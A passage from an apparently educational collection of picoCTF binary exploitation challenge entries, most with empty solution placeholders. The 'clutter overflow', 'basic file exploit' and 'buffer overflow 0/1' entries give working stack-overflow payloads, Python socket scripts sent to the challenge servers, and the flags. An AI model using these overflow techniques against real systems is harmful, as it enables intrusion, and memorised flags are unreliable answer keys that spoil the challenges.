picoCTF{}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## heres a libc

- Author: madStacks
- 90 Points

### Description

I am once again asking for you to pwn this binary [vuln](https://mercury.picoctf.net/static/797527dce806a5d1e7a59e6146aa4713/vuln) [libc.so.6](https://mercury.picoctf.net/static/797527dce806a5d1e7a59e6146aa4713/libc.so.6) [Makefile](https://mercury.picoctf.net/static/797527dce806a5d1e7a59e6146aa4713/Makefile) nc mercury.picoctf.net 37289

### Hints

1. PWNTools has a lot of useful features for getting offsets.

### Attachments

1. [vuln](https://mercury.picoctf.net/static/797527dce806a5d1e7a59e6146aa4713/vuln)
2. [libc.so.6](https://mercury.picoctf.net/static/797527dce806a5d1e7a59e6146aa4713/libc.so.6)
3. [Makefile](https://mercury.picoctf.net/static/797527dce806a5d1e7a59e6146aa4713/Makefile)

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

solution details

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## unsubscriptions are free

- Author: thelshell
- 100 Points

### Description

Check out my new video-game and spaghetti-eating streaming channel on Twixer! [program](https://mercury.picoctf.net/static/95f0b63e520ae2beece2ca11235808f8/vuln) and get a flag. [source](https://mercury.picoctf.net/static/95f0b63e520ae2beece2ca11235808f8/vuln.c) nc mercury.picoctf.net 58574

### Hints

1. [http://homes.sice.indiana.edu/yh33/Teaching/I433-2016/lec13-HeapAttacks.pdf](http://homes.sice.indiana.edu/yh33/Teaching/I433-2016/lec13-HeapAttacks.pdf)

### Attachments

1. [vuln](https://mercury.picoctf.net/static/95f0b63e520ae2beece2ca11235808f8/vuln)
2. [vuln.c](https://mercury.picoctf.net/static/95f0b63e520ae2beece2ca11235808f8/vuln.c)
3. [lec13-HeapAttacks.pdf](http://homes.sice.indiana.edu/yh33/Teaching/I433-2016/lec13-HeapAttacks.pdf)

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

solution details

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## filtered shellcode

- Author: madStacks
- 160 Points

### Description

A program that just runs the code you give it? That seems kinda boring... [fun](https://mercury.picoctf.net/static/0bfc0f68ad29f38974f990c78e45977e/fun) nc mercury.picoctf.net 40525

### Hints

1. Take a look at the calling convention and see how you might be able to setup all the registers

### Attachments

1. [fun](https://mercury.picoctf.net/static/0bfc0f68ad29f38974f990c78e45977e/fun)

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

solution details

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## kit engine

- Author: wparks
- 200 Points

### Description

Start your engines!! [d8](https://mercury.picoctf.net/static/9ed7e29037f1cb272de5dfe15e08d206/d8) [source.tar.gz](https://mercury.picoctf.net/static/9ed7e29037f1cb272de5dfe15e08d206/source.tar.gz) [server.py](https://mercury.picoctf.net/static/9ed7e29037f1cb272de5dfe15e08d206/server.py) Connect at mercury.picoctf.net 11433

### Hints

1. Having a good foundation may be helpful later
2. Make sure your shellcode works for the situation.

### Attachments

1. [d8](https://mercury.picoctf.net/static/9ed7e29037f1cb272de5dfe15e08d206/d8)
2. [source.tar.gz](https://mercury.picoctf.net/static/9ed7e29037f1cb272de5dfe15e08d206/source.tar.gz)
3. [server.py](https://mercury.picoctf.net/static/9ed7e29037f1cb272de5dfe15e08d206/server.py)

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

solution details

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## stonk market

- Author: madStacks
- 250 Points

### Description

I've learned my lesson, no more reading my API key into memory. Now there's no useful information you can leak! [vuln](https://mercury.picoctf.net/static/ad92b664c3b96d717872dd4fbd05941c/vuln) [vuln.c](https://mercury.picoctf.net/static/ad92b664c3b96d717872dd4fbd05941c/vuln.c) [Makefile](https://mercury.picoctf.net/static/ad92b664c3b96d717872dd4fbd05941c/Makefile) nc mercury.picoctf.net 43206

### Hints

None

### Attachments

1. [vuln](https://mercury.picoctf.net/static/ad92b664c3b96d717872dd4fbd05941c/vuln)
2. [vuln.c](https://mercury.picoctf.net/static/ad92b664c3b96d717872dd4fbd05941c/vuln.c)
3. [Makefile](https://mercury.picoctf.net/static/ad92b664c3b96d717872dd4fbd05941c/Makefile)

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

solution details

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## download horsepower

- Author: wparks
- 350 Points

### Description

Gotta go fast [d8](https://mercury.picoctf.net/static/83fc2beebc010843d1e1a4e4d57f269c/d8) [source.tar.gz](https://mercury.picoctf.net/static/83fc2beebc010843d1e1a4e4d57f269c/source.tar.gz) [server.py](https://mercury.picoctf.net/static/83fc2beebc010843d1e1a4e4d57f269c/server.py) Connect at mercury.picoctf.net 35453

### Hints

1. Learn how things are represented in memory
2. Try to make sure your exploit is resilient to differing offsets between objects
3. The V8 codebase changes often! Make sure you're accounting for any changes

### Attachments

1. [d8](https://mercury.picoctf.net/static/83fc2beebc010843d1e1a4e4d57f269c/d8)
2. [source.tar.gz](https://mercury.picoctf.net/static/83fc2beebc010843d1e1a4e4d57f269c/source.tar.gz)
3. [server.py](https://mercury.picoctf.net/static/83fc2beebc010843d1e1a4e4d57f269c/server.py)

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

solution details

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## the office

- Author: madStacks
- 400 Points

### Description

I'm tired of having to secure my data on the heap, so I decided to implement my own version of malloc with canaries. It's 10x more secure and only 100x slower! [the_office](https://mercury.picoctf.net/static/4b045306f3898f0a36fa6946297ad595/the_office) nc mercury.picoctf.net 23342

### Hints

1. The heapcheck function contains a lot of useful debugging info. See if you can get it to work.

### Attachments

1. [the_office](https://mercury.picoctf.net/static/4b045306f3898f0a36fa6946297ad595/the_office)

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

solution details

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## turboflan

- Author: wparks
- 450 Points

### Description

A Radiant Gourmet Flan told our young Turboflan hero to stop rushing and slow down. Has he listened? [d8](https://mercury.picoctf.net/static/e6d4c47ff770cf1be585f204b5fc1cde/d8) [source.tar.gz](https://mercury.picoctf.net/static/e6d4c47ff770cf1be585f204b5fc1cde/source.tar.gz) [server.py](https://mercury.picoctf.net/static/e6d4c47ff770cf1be585f204b5fc1cde/server.py) Connect at mercury.picoctf.net 17183

### Hints

1. There are a bunch of public writeups on v8 exploitation. Find the relevent ones
2. There likely are many ways to solve this problem.

### Attachments

1. [d8](https://mercury.picoctf.net/static/e6d4c47ff770cf1be585f204b5fc1cde/d8)
2. [source.tar.gz](https://mercury.picoctf.net/static/e6d4c47ff770cf1be585f204b5fc1cde/source.tar.gz)
3. [server.py](https://mercury.picoctf.net/static/e6d4c47ff770cf1be585f204b5fc1cde/server.py)

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

solution details

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## bizz fuzz

- Author: madStacks
- 500 Points

### Description

FizzBuzz was too easy, so I made something a little bit harder... There's a buffer overflow in this problem, good luck finding it! [vuln](https://mercury.picoctf.net/static/fa43ea7aff97aff61bbf7b403560adf6/vuln) nc mercury.picoctf.net 25546

### Hints

1. What functions are imported? Where are they used? And what do these strings mean?
2. Woah, some of these functions seem similar, can you figure them out one group at a time?
3. If fancy new dissassemblers take too long, there's always objdump!
4. Have you heard of binary instrumentation before? It might keep you from running in circles. No promises.
5. ANGR is another great framework.

### Attachments

1. [vuln](https://mercury.picoctf.net/static/fa43ea7aff97aff61bbf7b403560adf6/vuln)

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

solution details

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## cutter overflow

- Author: notdeghost
- 150 Points

### Description

Clutter, clutter everywhere and not a byte to use. nc mars.picoctf.net 31890

### Hints

None.

### Attachments

1. [chall.c](https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/clutter-overflow/chall.c)
2. [chall](https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/clutter-overflow/chall)

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

The source code is provided and the exploit can be clearly seen where the stdin to CLUTTER can be written to exceed the defined buffer 256 bytes:

~~~c
#include <stdio.h>
#include <stdlib.h>

#define SIZE 0x100
#define GOAL 0xdeadbeef

const char* HEADER = 
" ______________________________________________________________________\n"
"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|\n"
"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |\n"
"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|\n"
"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \\^ ^ |\n"
"|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \\ ^ _ ^ / |                | \\^ ^|\n"
"| ^/_\\^ ^ ^ /_________\\^ ^ ^ /_\\ | //  | /_\\ ^| |   ____  ____   | | ^ |\n"
"|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|\n"
"| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |\n"
"|^ ^ ^ ^ ^| /     (   \\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \\|^ ^|\n"
".-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |\n"
"|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\\ |^ ^|\n"
"| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |\n"
"|'.____'_^||/!\\@@@@@/!\\|| _'______________.'|==                    =====\n"
"|\\|______|===============|________________|/|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\" ||\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"  \n"
"\"\"''\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"";

int main(void)
{
  long code = 0;
  char clutter[SIZE];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);
 	
  puts(HEADER); 
  puts("My room is so cluttered...");
  puts("What do you see?");

  gets(clutter);


  if (code == GOAL) {
    printf("code == 0x%llx: how did that happen??\n", GOAL);
    puts("take a flag for your troubles");
    system("cat flag.txt");
  } else {
    printf("code == 0x%llx\n", code);
    printf("code != 0x%llx :(\n", GOAL);
  }

  return 0;
}
~~~

We can use Python to brute-force the buffer required and submit a request to the challenge server:
	
~~~py
import subprocess as sp
import socket
import time

exe = ("./chall")

str0 = "a"*256
str2 = "cccccccccccccccc"

i = 0
while True:
    payload = str0 + "b"*i + str2
    result = sp.run([exe, "import sys; print(sys.stdin.read())"], input=payload, capture_output=True, text=True)
    output = result.stdout.split("code")
    code = output[1].split("\n")[0].split(" ")[-1]
    if "62" in code:
        buffer = i-1+256
        print("buffer found; b = {}".format(buffer))
        break
    i += 1

str0 = b"a"*buffer
str1 = b"\xef\xbe\xad\xde"
payload = str0 + str1 + b"\n"

URL = "mars.picoctf.net"
PORT = 31890

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((URL, PORT))
print("connected to challenge server")
time.sleep(1)
recvbuff = s.recv(1000)
s.send(payload)
time.sleep(1)
recvbuff = s.recv(1000).decode()
s.close()
recvbuff = recvbuff.split("\n")
print("Flag = ")
print("\n".join(s for s in recvbuff if "pico" in s))
~~~

This provides the output:

~~~
buffer found; b = 264
connected to challenge server
Flag = 
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
~~~
	
</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## fermat strings

- Author: 
-  Points

### Description

Fermat's last theorem solver as a service. nc mars.picoctf.net 31929

### Hints

None.

### Attachments

1. [chall.c](https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/fermat-strings/chall.c)
2. [Dockerfile](https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/fermat-strings/Dockerfile)
3. [chall](https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/fermat-strings/chall)

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

solution details

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## saas

- Author: notdeghost
- 350 Points

### Description

Shellcode as a Service runs any assembly code you give it! For extra safety, you're not allowed to do a lot... nc mars.picoctf.net 31021

### Hints

None.

### Attachments

1. [chall.c](https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/saas/chall.c)
2. [Dockerfile](https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/saas/Dockerfile)
3. [chall](https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/saas/chall)

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

solution details

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## homework

- Author: TPA
- 400 Points

### Description

"time to do some homework!" nc mars.picoctf.net 31689

### Hints

None.

### Attachments

1. [homework](https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/homework/homework)

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

solution details

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## lockdown horses

- Author: KFB
- 450 Points

### Description

Here at Moar Horse Industries, we believe, especially during these troubling times, that everyone should be able to make a horse say whatever they want. We were tired of people getting shells everywhere, so now it should be impossible! Can you still find a way to rope yourself out of this one? Flag is in the current directory. [seccomp-tools](https://github.com/david942j/seccomp-tools) might be helpful. nc mars.picoctf.net 31809

### Hints

None.

### Attachments

1. [seccomp-tools](https://github.com/david942j/seccomp-tools)
2. [horse](https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/lockdown-horses/horse)
3. [Dockerfile](https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/lockdown-horses/Dockerfile)

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

solution details

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## vr school

- Author: 
-  Points

### Description

Join my online school! Don't get lost in the virtual functions.. nc mars.picoctf.net 31638

### Hints

None.

### Attachments

1. [Dockerfile](https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/vr-school/Dockerfile)
2. [chall](https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/vr-school/chall)

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

solution details

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## basic file exploit

- Author: Will Hong
- 100 Points

### Description

The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it! Connect to the program with netcat: $ nc saturn.picoctf.net 49698 The program's source code with the flag redacted can be downloaded [here](https://artifacts.picoctf.net/c/541/program-redacted.c).

### Hints

1. Try passing in things the program doesn't expect. Like a string instead of a number.

### Attachments

1. [program-redacted.c](https://artifacts.picoctf.net/c/541/program-redacted.c)

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We are given the source code:

~~~c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <stdint.h>
#include <ctype.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/types.h>


#define WAIT 60


static const char* flag = "[REDACTED]";

static char data[10][100];
static int input_lengths[10];
static int inputs = 0;



int tgetinput(char *input, unsigned int l)
{
    fd_set          input_set;
    struct timeval  timeout;
    int             ready_for_reading = 0;
    int             read_bytes = 0;
    
    if( l <= 0 )
    {
      printf("'l' for tgetinput must be greater than 0\n");
      return -2;
    }
    
    
    /* Empty the FD Set */
    FD_ZERO(&input_set );
    /* Listen to the input descriptor */
    FD_SET(STDIN_FILENO, &input_set);

    /* Waiting for some seconds */
    timeout.tv_sec = WAIT;    // WAIT seconds
    timeout.tv_usec = 0;    // 0 milliseconds

    /* Listening for input stream for any activity */
    ready_for_reading = select(1, &input_set, NULL, NULL, &timeout);
    /* Here, first parameter is number of FDs in the set, 
     * second is our FD set for reading,
     * third is the FD set in which any write activity needs to updated,
     * which is not required in this case. 
     * Fourth is timeout
     */

    if (ready_for_reading == -1) {
        /* Some error has occured in input */
        printf("Unable to read your input\n");
        return -1;
    } 

    if (ready_for_reading) {
        read_bytes = read(0, input, l-1);
        if(input[read_bytes-1]=='\n'){
        --read_bytes;
        input[read_bytes]='\0';
        }
        if(read_bytes==0){
            printf("No data given.\n");
            return -4;
        } else {
            return 0;
        }
    } else {
        printf("Timed out waiting for user input. Press Ctrl-C to disconnect\n");
        return -3;
    }

    return 0;
}


static void data_write() {
  char input[100];
  char len[4];
  long length;
  int r;
  
  printf("Please enter your data:\n");
  r = tgetinput(input, 100);
  // Timeout on user input
  if(r == -3)
  {
    printf("Goodbye!\n");
    exit(0);
  }
  
  while (true) {
    printf("Please enter the length of your data:\n");
    r = tgetinput(len, 4);
    // Timeout on user input
    if(r == -3)
    {
      printf("Goodbye!\n");
      exit(0);
    }
  
    if ((length = strtol(len, NULL, 10)) == 0) {
      puts("Please put in a valid length");
    } else {
      break;
    }
  }

  if (inputs > 10) {
    inputs = 0;
  }

  strcpy(data[inputs], input);
  input_lengths[inputs] = length;

  printf("Your entry number is: %d\n", inputs + 1);
  inputs++;
}


static void data_read() {
  char entry[4];
  long entry_number;
  char output[100];
  int r;

  memset(output, '\0', 100);
  
  printf("Please enter the entry number of your data:\n");
  r = tgetinput(entry, 4);
  // Timeout on user input
  if(r == -3)
  {
    printf("Goodbye!\n");
    exit(0);
  }
  
  if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
  }

  entry_number--;
  strncpy(output, data[entry_number], input_lengths[entry_number]);
  puts(output);
}


int main(int argc, char** argv) {
  char input[3] = {'\0'};
  long command;
  int r;

  puts("Hi, welcome to my echo chamber!");
  puts("Type '1' to enter a phrase into our database");
  puts("Type '2' to echo a phrase in our database");
  puts("Type '3' to exit the program");

  while (true) {   
    r = tgetinput(input, 3);
    // Timeout on user input
    if(r == -3)
    {
      printf("Goodbye!\n");
      exit(0);
    }
    
    if ((command = strtol(input, NULL, 10)) == 0) {
      puts("Please put in a valid number");
    } else if (command == 1) {
      data_write();
      puts("Write successful, would you like to do anything else?");
    } else if (command == 2) {
      if (inputs == 0) {
        puts("No data yet");
        continue;
      }
      data_read();
      puts("Read successful, would you like to do anything else?");
    } else if (command == 3) {
      return 0;
    } else {
      puts("Please type either 1, 2 or 3");
      puts("Maybe breaking boundaries elsewhere will be helpful");
    }
  }

  return 0;
}
~~~

We can see the flag is returned when the user provides entry_number 0 to the data_read() subfunction.  Using this we can create and entry and recall the flag:

~~~shell
$ nc saturn.picoctf.net 49698
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
1
1
Please enter your data:
1
1
Please enter the length of your data:
1
1
Your entry number is: 1
Write successful, would you like to do anything else?
2
2
Please enter the entry number of your data:
0
0
picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_1B9F5942}
~~~

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_1B9F5942}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---
	
## buffer overflow 0

- Author: Alex Fulton / Palash Oswal
- 100 Points

### Description

Smash the stack Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/520/vuln). You can view source [here](https://artifacts.picoctf.net/c/520/vuln.c). And connect with it using: nc saturn.picoctf.net 53935

### Hints

1. How can you trigger the flag to print?
2. If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
3. Run man gets and read the BUGS section. How many characters can the program really read?

### Attachments

1. [vuln](https://artifacts.picoctf.net/c/520/vuln)
2. [vuln.c](https://artifacts.picoctf.net/c/520/vuln.c)

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

This program can be exploited very simply by entering an input that overflows the buffer.  We can enter 100 characters and get the flag:

~~~shell
$ nc saturn.picoctf.net 53935
Input: 1234567891234567891234567891234567891234567891234567891234567891234567891234567891234567890
picoCTF{ov3rfl0ws_ar3nt_that_bad_a065d5d9}
exit
~~~

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{ov3rfl0ws_ar3nt_that_bad_a065d5d9}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---
	
## CVE XXXX XXXX

- Author: Mubarak Mikail
- 100 Points

### Description

Enter the CVE of the vulnerability as the flag with the correct flag format: picoCTF{CVE-XXXX-XXXXX} replacing XXXX-XXXXX with the numbers for the matching vulnerability. The CVE we're looking for is the first recorded remote code execution (RCE) vulnerability in 2021 in the Windows Print Spooler Service, which is available across desktop and server versions of Windows operating systems. The service is used to manage printers and print servers.

### Hints

1. We're not looking for the Local Spooler vulnerability in 2021...

### Attachments

None.
	
### Solutions

<details>

<summary markdown="span">Solution 1</summary>

A google search for the CVE provides the details: CVE-2021-34527

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{CVE-2021-34527}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## buffer overflow 1

- Author: Sanjay C / Palash Oswal
- 200 Points

### Description

Control the return address.
Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/250/vuln).
You can view source [here](https://artifacts.picoctf.net/c/250/vuln.c). And connect with it using:

~~~shell
$ nc saturn.picoctf.net 62538
~~~

### Hints

1. Make sure you consider big Endian vs small Endian.
2. Changing the address of the return pointer can call different functions.

### Attachments

1. [vuln](https://artifacts.picoctf.net/c/250/vuln)
2. [vuln.c](https://artifacts.picoctf.net/c/250/vuln.c)
	
### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Running the program, we can see a user input is taken and the program jumps to a memory address:

~~~shell
$ ./vuln
Please enter your string: 
test
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
~~~

We can see the short user input does not affect the address:

~~~shell
$ ./vuln
Please enter your string: 
1234
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
~~~

Reviewing the source code we can see return address should point to the main function.  The user input allocation is a fixed buffer size of 32 so we can overflow this and possibly chanfe the return address:

~~~c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
~~~

Let us try a 32-character input:

~~~shell
$ ./vuln
Please enter your string: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
~~~

This provides the correct response, adding more characters:

~~~shell
$ ./vuln
Please enter your string: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
Okay, time to return... Fingers Crossed... Jumping to 0x65656565
Segmentation fault (core dumped)
~~~

We have overwritten the return address with 0x65656565 which corresponds to the "e" characters in the input.  We can identify the endian-ness by entering a variable string in place of the "e" characters:

~~~shell
$ ./vuln
Please enter your string: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0123
Okay, time to return... Fingers Crossed... Jumping to 0x33323130
Segmentation fault (core dumped)
~~~

We can see this is in little-endian format, we can change the address to reflect the "win" function that will return the flag.  We can use gdb to find the address of the win function:

~~~shell
$ gdb vuln
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from vuln...
(No debugging symbols found in vuln)
(gdb) info addr win
Symbol "win" is at 0x80491f6 in a file compiled without debugging.
~~~

We can use python to pipe the new address to the executable:

~~~shell
$ python -c "print('a'*44+'\xf6\x91\x04\x08')" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
Please create 'flag.txt' in this directory with your own debugging flag.
~~~

We can use the socket library to connect to the remote server using Python and retrieve the flag:

~~~py
import socket
import binascii
import time

URL = "saturn.picoctf.net"
PORT = 51208

sock = socket.socket()
sock.connect((URL,PORT))

data = sock.recv(1024).decode()
print(data)

a = binascii.unhexlify(hex(0xf6)[2:])
b = binascii.unhexlify(hex(0x91)[2:])
c = binascii.unhexlify("0"+hex(0x04)[2:])
d = binascii.unhexlify("0"+hex(0x08)[2:])

InputString = ("a"*44).encode()+a+b+c+d+"\n".encode()
print(InputString)
sock.send(InputString)
time.sleep(1)
data = sock.recv(1024).decode()
print(data)

sock.close()
~~~

This provides the output:

~~~
Please enter your string: 

b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf6\x91\x04\x08\n'
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_ad2f467b}
~~~

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{addr3ss3s_ar3_3asy_ad2f467b}
~~~

</details>

---

